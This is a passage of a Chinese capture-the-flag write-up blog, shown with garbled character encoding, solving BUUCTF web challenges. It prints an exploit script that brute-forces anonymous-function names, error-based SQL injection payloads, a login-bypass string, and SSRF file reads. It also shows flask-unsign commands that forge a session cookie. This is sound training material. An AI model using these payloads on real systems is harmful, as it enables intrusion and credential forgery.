class="code"><pre><code class="hljs 1c">a&#x27;,&#x27;<span class="hljs-number">1</span>&#x27;,&#x27;<span class="hljs-number">1</span>&#x27;,&#x27;<span class="hljs-number">1</span>&#x27;,0x4f3a363a<span class="hljs-number">226865</span>6c<span class="hljs-number">70657222</span>3a323a7b733a393a<span class="hljs-number">2200</span>2a<span class="hljs-number">00696676696577</span>223b623a313b733a393a<span class="hljs-number">2200</span>2a<span class="hljs-number">0063</span>6f6e<span class="hljs-number">66696722</span>3b733a353a222f666c<span class="hljs-number">616722</span>3b7d)#.jpg<br></code></pre></td></tr></table></figure><h4 id="æ€»ç»“æ€è·¯ï¼š"><a href="#æ€»ç»“æ€è·¯ï¼š" class="headerlink" title="æ€»ç»“æ€è·¯ï¼š"></a>æ€»ç»“æ€è·¯ï¼š</h4><p>å¦‚ä½•è€ƒè™‘ååºåˆ—åŒ–çš„å…¥å£å’Œç»ˆç‚¹ï¼Ÿ<code>protected</code>å±æ€§åœ¨ååºåˆ—åŒ–æ—¶åº”æ³¨æ„ä»€ä¹ˆï¼Ÿé™¤æ­¤ä»¥å¤–ï¼Œ<code>private</code>å±æ€§å‘¢ï¼Ÿå˜é‡è¦†ç›–ï¼Ÿ<code>SQL</code>è¯­å¥ä¸­è¿›åˆ¶å½¢å¼çš„æ•°æ®æ˜¯å¦æœ‰å¿…è¦ä½¿ç”¨å•å¼•å·æˆ–åŒå¼•å·æ‹¬èµ·æ¥ï¼Ÿ</p><h2 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$MY</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;die(`cat flag.php`);&quot;</span>);<br><span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-number">32</span>));<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function SUCTF_<span class="hljs-subst">$hash</span>()&#123;&quot;</span><br>    .<span class="hljs-string">&quot;global \$MY;&quot;</span><br>    .<span class="hljs-string">&quot;\$MY();&quot;</span><br>    .<span class="hljs-string">&quot;&#125;&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func_name&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func_name&quot;</span>]();<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>åˆ©ç”¨<code>create_function</code>åˆ›å»ºäº†ä¸€ä¸ªå‡½æ•°ç„¶åç»™<code>$MY</code>ã€‚å†åˆ©ç”¨<code>eval</code>åˆ›å»ºäº†ä¸€ä¸ªå‡½æ•°çš„å®šä¹‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SUCTF_</span>$<span class="hljs-title">hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">global</span> \<span class="hljs-variable">$MY</span>;<br>\<span class="hljs-variable">$MY</span>();<br>&#125;;<br></code></pre></td></tr></table></figure><p>ç„¶å<code>GET</code>ä¼ å‚<code>func_name</code>ï¼Œå¯ä»¥è¿›è¡Œå‡½æ•°è°ƒç”¨ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">if</span>(isset($_GET[&#x27;func_name&#x27;]))&#123;<br>    $_GET<span class="hljs-selector-attr">[<span class="hljs-string">&quot;func_name&quot;</span>]</span>();<br>    <span class="hljs-built_in">die</span>();<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ç°åœ¨çš„é—®é¢˜å°±æ˜¯<code>$hash = bin2hex(openssl_random_pseudo_bytes(32))</code>è¿™ä¸ªä¸œè¥¿ã€‚ã€‚è¿™ä¸ªä¼ªéšæœºæ•°ä¸çŸ¥é“æ€ä¹ˆ å¤„ç†ã€‚</p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105225558">å‚è€ƒèµ„æ–™</a></p><p><a href="https://yang1k.github.io/post/2018-suctf/">å‚è€ƒèµ„æ–™</a></p><blockquote><p>create_functionçš„åŒ¿åå‡½æ•°ä¹Ÿæ˜¯æœ‰åå­—çš„ï¼Œåå­—æ˜¯\x00lambda_%dï¼Œå…¶ä¸­%dä»£è¡¨ä»–æ˜¯å½“å‰è¿›ç¨‹ä¸­çš„ç¬¬å‡ ä¸ªåŒ¿åå‡½æ•°</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$MY</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;die(`cat flag.php`);&quot;</span>);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$MY</span>);<br><span class="hljs-comment">//è¾“å‡ºstring(9) &quot;(æˆ‘æ˜¯ä¸€ä¸ªä¸å¯è§å­—ç¬¦)lambda_1&quot;ï¼Œåé¢çš„æ•°å­—æ˜¯éšæœºå˜çš„ã€‚</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨<code>burp</code>çš„<code>intruder</code>æ¨¡å—çˆ†ç ´ï¼Œæˆ–è€…å†™ä¸ª<code>python</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://e50c90bb-2a05-4887-8d21-139d4eaa33de.node5.buuoj.cn:81/&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">5000</span>):<br>    payload = <span class="hljs-string">&quot;\x00lambda_&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    get_data = &#123;<span class="hljs-string">&quot;func_name&quot;</span>: payload&#125;<br>    res = requests.get(url, params=get_data, timeout=<span class="hljs-number">5</span>)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(res.text)<br>        <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><h4 id="æ€è·¯æ€»ç»“ï¼š-1"><a href="#æ€è·¯æ€»ç»“ï¼š-1" class="headerlink" title="æ€è·¯æ€»ç»“ï¼š"></a>æ€è·¯æ€»ç»“ï¼š</h4><p><code>create_function</code>ï¼ŸåŒ¿åå‡½æ•°çš„åå­—æ˜¯ä»€ä¹ˆï¼Ÿ</p><h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><p>è¿›å»å°±æ˜¯ä¸ªæŠ¥é”™ï¼š</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">Warning: mysqli_connect(): (HY000/2002): Connection refused in /var/www/html/index.php on line 2<br><span class="hljs-keyword">Error: </span>Unable to connect to MySQL. Debugging errno: 2002 Debugging error: Connection refused<br></code></pre></td></tr></table></figure><p><code>index.php</code>ï¼š</p><p><img src="/img/roosterctfbabyweb1.png" alt="roosterctfbabyweb1"></p><p>banäº†å•å¼•å·åŒå¼•å·ï¼Œ<code>union</code>,<code>or</code>,<code>sleep</code>è¿™å‡ ä¸ªå…³é”®å­—ã€‚</p><p>åæ¥æµ‹è¯•å‘ç°<code>information</code>è¿™ä¸œè¥¿å¹¶æ²¡æœ‰è¿‡æ»¤ã€‚</p><p><code>1 order by 3#</code>è¿”å› <code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code>,<code>order by 2</code>æ­£å¸¸ã€‚ä¸€å…±ä¸¤åˆ—ã€‚</p><p>è¯•äº†ä¸‹æŠ¥é”™æ³¨å…¥ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">updatexml(<span class="hljs-number">1</span>%<span class="hljs-number">2</span>Cconcat(<span class="hljs-number">0x7e</span>%<span class="hljs-number">2</span>Cdatabase()%<span class="hljs-number">2</span>C0x7e)%<span class="hljs-number">2</span>C1)%<span class="hljs-number">23</span><br>//XPATH syntax error: <span class="hljs-string">&#x27;~sql_injection~&#x27;</span><br>updatexml(<span class="hljs-number">1</span>%<span class="hljs-number">2</span>Cconcat(<span class="hljs-number">0x7e</span>%<span class="hljs-number">2</span>C(<span class="hljs-keyword">select</span>+<span class="hljs-built_in">table_name</span>+<span class="hljs-keyword">from</span>+information_schema.<span class="hljs-keyword">tables</span>+<span class="hljs-keyword">where</span>+table_schema%<span class="hljs-number">3</span>Ddatabase()+<span class="hljs-keyword">limit</span>+<span class="hljs-number">0</span>%<span class="hljs-number">2</span>C1)%<span class="hljs-number">2</span>C0x7e)%<span class="hljs-number">2</span>C1)<br>//XPATH syntax error: <span class="hljs-string">&#x27;~users~&#x27;</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-type">char</span>(<span class="hljs-number">117</span>,<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">115</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) #è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œusersä¸€å®šè¦å†™æˆ<span class="hljs-type">char</span>çš„å½¢å¼æ‰æœ‰å›æ˜¾ã€‚ã€‚ä¸çŸ¥é“ä¸ºå•¥<br>//XPATH syntax error: <span class="hljs-string">&#x27;~USER,CURRENT_CONNECTIONS,TOTAL_&#x27;</span><br>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">user</span>) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br>//<span class="hljs-keyword">admin</span>,john<br>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(uniqueid) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br>//<span class="hljs-number">837461526918364526</span>,<span class="hljs-number">123456789928</span><br><br></code></pre></td></tr></table></figure><p>è¾“å…¥<code>837461526918364526</code>è¿™ä¸ª<code>uniqueid</code>å³å¯ã€‚</p><p>åé¢çœ‹å…¶å®ƒå¸ˆå‚…çš„<code>wp</code>ç›´æ¥ç”¨è¿™ç§ä¸‡èƒ½å¯†ç ç™»å½•ï¼š</p><p><code>1 || 1=1 limit 0,1</code> ï¼Œè¿™æ—¶<code>SQL</code>è¯­å¥å°±å˜æˆäº†ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> uniqueid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">||</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><code>uniqueid</code>è¿™ä¸œè¥¿ä¸€å…±ä¸¤åˆ—ï¼Œ<code>admin</code>å¯¹åº”çš„è¿˜åœ¨ç¬¬ä¸€åˆ—ã€‚æ‰€ä»¥<code>limit 0,1</code>å°±ç›¸å½“æŸ¥çš„<code>837461526918364526</code>å¯¹åº”çš„ç»“æœï¼Œæˆ–è€…ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> uniqueid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">||</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> limit <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="æ€»ç»“æ€è·¯"><a href="#æ€»ç»“æ€è·¯" class="headerlink" title="æ€»ç»“æ€è·¯:"></a>æ€»ç»“æ€è·¯:</h4><p><code>updatexml</code>æŠ¥é”™æ³¨å…¥ï¼Ÿ<code>char</code>å½¢å¼ç»•è¿‡ï¼Ÿè‹¥è¿‡æ»¤äº†<code>or</code>ï¼Œä¸‡èƒ½å¯†ç åº”å¦‚ä½•æ„é€ ï¼Ÿ</p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web4"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web4" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web4"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web4</h2><p><img src="/img/ciscnweb4-1.png" alt="ciscnweb4-1"></p><p><code>read somethings</code>è·³è½¬ï¼Œæ³¨æ„<code>URL</code>ï¼š</p><p><code>http://23348a06-4528-47fb-8442-d0428080c651.node5.buuoj.cn:81/read?url=https://baidu.com</code></p><p><img src="/img/ciscnweb4-2.png" alt="ciscnweb4-2"></p><p>è¾“å…¥ä¸å­˜åœ¨çš„<code>URL</code>ä¼šæç¤º<code>no response</code>ï¼š</p><p><img src="/img/ciscnweb4-4.png" alt="ciscnweb4-4"></p><p>å°è¯•è¯»ä¸‹<code>/etc/passwd</code>:</p><p><img src="/img/ciscnweb4-5.png" alt="ciscnweb4-5"></p><p>ç›´æ¥è¯»<code>flag</code>å‘ç°è¢«è¿‡æ»¤äº†:</p><p><img src="/img/ciscnweb4-6.png" alt="ciscnweb4-6"></p><p>åˆ©ç”¨base64ç¼–ç æ‰§è¡Œä¸‹ï¼š<code>echo L2ZsYWc=|base64 -d</code>ï¼Œç»“æœè¿”å›äº†<code>no response</code>ã€‚ã€‚ç„¶åæƒ³èµ·åˆšæ‰<code>glzjin</code>è¿™ä¸ªç”¨æˆ·çš„å®¶ç›®å½•æ˜¯<code>/app</code>ï¼Œå°è¯•è¯»å–<code>app.py</code>:</p><blockquote><p><strong>url&#x2F;read?id&#x3D;xxxxè¿™ç§åœ¨urlå’Œå‚æ•°ä¸­é—´åˆä¼šæœ‰ä¸€æ®µå­—ç¬¦ä¸²çš„ï¼Œå¯ä»¥è€ƒè™‘æ˜¯å†™äº†è·¯ç”±ï¼Œä¸æ˜¯phpåç«¯ï¼Œå¯èƒ½æ˜¯pythonåç«¯</strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å¯¼å…¥æ¨¡å—</span><br>encoding:utf-<span class="hljs-number">8</span> <br><span class="hljs-keyword">import</span> re, random, uuid, urllib <br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request<br><br><span class="hljs-comment"># åˆ›å»º Flask åº”ç”¨å’Œé…ç½®</span><br>app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random() * <span class="hljs-number">233</span>)<br>app.debug = <span class="hljs-literal">True</span><br><br><span class="hljs-comment"># å®šä¹‰æ ¹è·¯å¾„è·¯ç”±</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;www-data&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello World! Read somethings&#x27;</span><br><br><span class="hljs-comment"># å®šä¹‰è¯»å–è·¯å¾„è·¯ç”±</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    <span class="hljs-keyword">try</span>:<br>        url = request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        m = re.findall(<span class="hljs-string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)<br>        n = re.findall(<span class="hljs-string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)<br>        <br>        <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦åŒ…å«æ•æ„Ÿå…³é”®è¯</span><br>        <span class="hljs-keyword">if</span> m <span class="hljs-keyword">or</span> n:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No Hack&#x27;</span><br>        <br>        <span class="hljs-comment"># å°è¯•æ‰“å¼€ç»™å®šçš„ URL å¹¶è¿”å›å†…å®¹</span><br>        res = urllib.urlopen(url)<br>        <span class="hljs-keyword">return</span> res.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(ex))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no response&#x27;</span><br><br><span class="hljs-comment"># å®šä¹‰è·å– flag è·¯ç”±</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">and</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;fuck&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>).read()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access denied&#x27;</span><br><br><span class="hljs-comment"># ä¸»ç¨‹åº</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><p>ä»£ç å€’æ˜¯ä¸é•¿ï¼Œé¦–å…ˆ<code>URL</code>ä¸å…è®¸å‡ºç°<code>flag</code>å’Œä»¥<code>file</code>å¼€å¤´ã€‚æœ€å¼€å§‹å®šä¹‰<code>session[&#39;username&#39;] = &#39;www-data&#39;</code>ï¼Œåœ¨è®¿é—®<code>/flag</code>è·¯ç”±æ—¶å¦‚æœ<code>if session and session[&#39;username&#39;] == &#39;fuck&#39;:</code>å³å¯ã€‚å¦å¤–æ³¨æ„åˆ°è¿™ä¸œè¥¿å¼€äº†<code>debug</code>æ¨¡å¼ï¼Œåé¢çœ‹çœ‹èƒ½ä¸èƒ½é€šè¿‡æ„é€ <code>pin</code>ç è§£é¢˜ã€‚</p><p>çœ‹ä¸‹å¯¹å¯†é’¥<code>SECRET_KEY</code>æ˜¯æ€ä¹ˆæ„é€ çš„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random() * <span class="hljs-number">233</span>)<br></code></pre></td></tr></table></figure><p>ç”¨æœ¬åœ°è®¡ç®—æœºçš„ç½‘ç»œç¡¬ä»¶åœ°å€ï¼ˆMACåœ°å€ï¼‰ä½œä¸ºéšæœºæ•°ç”Ÿæˆå™¨çš„ç§å­ï¼Œç”Ÿæˆä¸€ä¸ªä¼ªéšæœºçš„æµ®ç‚¹æ•°ï¼ˆåœ¨ 0 åˆ° 233 ä¹‹é—´ï¼‰ï¼Œå°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚æ‰€ä»¥æƒ³åŠæ³•è¯»<code>MAC</code>åœ°å€å°±è¡Œï¼š</p><p><img src="/img/ciscnweb4key1.png" alt="ciscnweb4key1"></p><p>è¿™é‡Œæˆ‘çœ‹<code>wp</code>éƒ½æ˜¯ç›´æ¥å»è¯»äº†<code>eth0</code>ç½‘å¡ã€‚ã€‚ä¸æ˜¯å¾ˆæ‡‚ä¸ºå•¥</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">/read?url=/sys/<span class="hljs-keyword">class</span>/<span class="hljs-symbol">net</span>/<span class="hljs-symbol">eth0</span>/<span class="hljs-symbol">address</span><br>ç»“æœï¼š<span class="hljs-symbol">aa:<span class="hljs-symbol">31</span>:<span class="hljs-symbol">08</span>:<span class="hljs-symbol">a5</span>:<span class="hljs-symbol">b9</span>:<span class="hljs-symbol">2b</span></span><br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°MACåœ°å€å°±èƒ½ç”Ÿæˆç§å­(æ³¨æ„è¿™é‡Œè¦ç”¨python2ï¼Œ2å’Œ3ä¿ç•™çš„ä½æ•°ä¸ä¸€æ ·)ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-comment"># Write Python 2 code in this online editor and run it.</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> uuid<br><br><span class="hljs-comment"># å‡è®¾çš„MACåœ°å€</span><br>example_mac_address = <span class="hljs-string">&#x27;aa:31:08:a5:b9:2b&#x27;</span><br><br><span class="hljs-comment"># è½¬æ¢MACåœ°å€ä¸ºæ•´æ•°</span><br>mac_integer = <span class="hljs-built_in">int</span>(example_mac_address.replace(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>), <span class="hljs-number">16</span>)<br><br><span class="hljs-comment"># ä½¿ç”¨MACåœ°å€æ•´æ•°åˆå§‹åŒ–éšæœºæ•°ç”Ÿæˆå™¨çš„ç§å­</span><br>random.seed(mac_integer)<br><br><span class="hljs-comment"># ç”Ÿæˆ0åˆ°233ä¹‹é—´çš„éšæœºæµ®ç‚¹æ•°</span><br>random_float = random.random() * <span class="hljs-number">233</span><br><br><span class="hljs-comment"># å°†ç”Ÿæˆçš„éšæœºæµ®ç‚¹æ•°ä½œä¸ºå­—ç¬¦ä¸²èµ‹å€¼ç»™åº”ç”¨ç¨‹åºçš„SECRET_KEY</span><br>app_config_secret_key = <span class="hljs-built_in">str</span>(random_float)<br><br><span class="hljs-comment"># è¾“å‡ºç»“æœ</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MACåœ°å€æ•´æ•°:&quot;</span>, mac_integer) <span class="hljs-comment">#MACæ˜¯åå…­è¿›åˆ¶çš„ï¼Œç›´æ¥æŠŠå®ƒè½¬ä¸ºæ•´æ•°</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç”Ÿæˆçš„éšæœºæµ®ç‚¹æ•°:&quot;</span>, random_float)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;åº”ç”¨ç¨‹åºçš„SECRET_KEY:&quot;</span>, app_config_secret_key)<br><span class="hljs-comment"># ç»“æœï¼š22.4625144346</span><br></code></pre></td></tr></table></figure><p>æŠ“åŒ…çœ‹ä¸‹<code>SESSION</code>:</p><p><code>eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.ZZkYxw.byfbQe9w4mPGETQZMlAOtQgjckI</code></p><p>æ”¾<code>FLASK-UNSIGN</code>é‡Œï¼š</p><p><img src="/img/ciscnweb4key2flag.png" alt="ciscnweb4key2flag"></p><p>é¡ºä¾¿è®°å½•ä¸‹ç”¨æ³•ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">flask-unsign <span class="hljs-attr">--unsign</span> <span class="hljs-attr">--decode</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;eyJ1Ijp7IiBiIjoiZ0FTVkdBQUFBQUFBQUFDTUNGOWZiV0ZwYmw5ZmxJd0VWWE5sY3BTVGxDbUJsQzQ9In19.ZbCRbw.VSVb2deVeKAEUTAotx5adFSrhgY&quot;</span> <span class="hljs-attr">--secret</span> <span class="hljs-string">&#x27;42e9&#x27;</span> <span class="hljs-attr">--no-literal-eval</span><br><br>flask-unsign <span class="hljs-attr">--sign</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;&#123;&#x27;username&#x27;: b&#x27;fuck&#x27;&#125;&quot;</span> <span class="hljs-attr">--secret</span> <span class="hljs-string">&#x27;22.4625144346&#x27;</span> <span class="hljs-attr">--no-literal-eval</span><br><br>&#123;<span class="hljs-string">&#x27;balance&#x27;</span>: <span class="hljs-number">1336</span>, <span class="hljs-string">&#x27;purchases&#x27;</span>: <span class="hljs-selector-attr">[]</span>&#125;<br>flask-unsign <span class="hljs-attr">--sign</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;&#123;&#x27;balance&#x27;: 1338, &#x27;purchases&#x27;: []&#125;&quot;</span> <span class="hljs-attr">--secret</span> <span class="hljs-string">&#x27;ijbufup9Ma6ZKnCWzvhodHqVjNMPk6Nw4NTNnbdr&#x27;</span> <span class="hljs-attr">--no-literal-eval</span><br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®<code>/flag</code>è·¯ç”±æ”¹ä¸‹sessionå­—æ®µå°±è¡Œ</p><p><code>PIN</code>ç æ„é€ å‚è€ƒè¿™ä½å¸ˆå‚…çš„æ–‡ç« ï¼š<code>https://xz.aliyun.com/t/11647?page=1</code></p><h4 